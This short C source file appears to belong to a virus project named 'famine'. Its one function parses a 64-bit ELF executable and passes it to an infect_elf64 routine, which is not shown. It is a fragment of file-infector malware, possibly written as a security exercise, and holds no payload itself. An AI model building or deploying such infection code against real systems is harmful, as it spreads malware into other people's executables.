#include "famine.h"

int process_elf64(t_file *file)
{
	t_elf64 elf64;

	if (parse_elf64(file, &elf64))
		return (1);

	return (infect_elf64(file, &elf64));
}
